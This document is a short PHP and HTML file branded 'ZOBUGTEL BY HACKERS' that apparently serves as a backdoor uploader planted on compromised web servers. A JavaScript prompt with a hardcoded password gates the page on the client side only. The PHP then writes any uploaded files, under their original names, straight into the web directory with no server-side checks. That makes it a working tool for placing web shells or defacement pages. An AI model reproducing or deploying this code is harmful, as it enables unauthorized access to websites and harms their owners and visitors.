<SCRIPT language="JavaScript">
<!--
var password;
var pass1="kakatgros";
password=prompt('PASSWORD UPLOAD','');
if (password==pass1){alert(' yessss !!');}
else{window.location="";}
//-->
</SCRIPT>
<font align="center" color="#40FF00" face="Comic Sans MS" size="8">~~ ZOBUGTEL BY HACKERS ~~</font>
<?php
if($_POST['pgaction']=="upload")
    upload();
else
    uploadForm();
function uploadForm() {
?>
<html>
<head>
<title>ZOBUGTEL BY HACKERS </title>
</head>
<body bgcolor="#000000">
<form name="frm" method="post" onsubmit="return validate(this);" enctype="multipart/form-data">
<input type="hidden" name="pgaction">
    <?php if ($GLOBALS['msg']) { echo '<center><span class="err"><font color="red">'.$GLOBALS['msg'].'</font></span></center>'; }?>
    <table align="center" cellpadding="4" cellspacing="0">
        <tr class="txt">
            <td valign="top"><div id="dvFile"><input type="file" name="item_file[]"></div></td>
            <td valign="top"><a href="javascript:_add_more();" title="Add more">+</a></td>
        </tr>
        <tr>
            <td align="center" colspan="2"><input type="submit" value="Upload File"></td>
        </tr>
    </table>
</form>
<script language="javascript">
<!--
    function _add_more() {
        var txt = "<br><input type=\"file\" name=\"item_file[]\">";
        document.getElementById("dvFile").innerHTML += txt;
    }
    function validate(f){
        var chkFlg = false;
        for(var i=0; i < f.length; i++) {
            if(f.elements[i].type=="file" && f.elements[i].value != "") {
                chkFlg = true;
            }
        }
        if(!chkFlg) {
            alert('Please browse/choose at least one file');
            return false;
        }
        f.pgaction.value='upload';
        return true;
    }
//-->
</script>
</body>
</html>
<?php
}
function upload(){    
    if(count($_FILES["item_file"]['name'])>0) {
        $GLOBALS['msg'] = "";
        for($j=0; $j < count($_FILES["item_file"]['name']); $j++) {
            $filen = $_FILES["item_file"]['name']["$j"];
            $path = ''.$filen;
            if(move_uploaded_file($_FILES["item_file"]['tmp_name']["$j"],$path)) {
                $GLOBALS['msg'] .= "File# ".($j+1)." ($filen) uploaded successfully<br>";
            }
        }
    }
    else {
        $GLOBALS['msg'] = "No files found to upload";
    }
    uploadForm();
}
?>
